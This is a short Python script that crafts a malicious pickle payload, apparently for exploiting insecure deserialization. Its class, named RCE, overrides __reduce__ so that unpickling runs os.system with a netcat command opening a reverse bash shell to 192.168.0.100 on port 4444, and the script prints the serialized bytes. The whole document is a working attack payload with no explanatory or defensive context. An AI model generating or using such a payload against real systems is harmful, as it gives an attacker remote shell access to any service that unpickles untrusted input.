import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('nc -e /bin/bash 192.168.0.100 4444',))

pickled = pickle.dumps(RCE())
print(pickled)
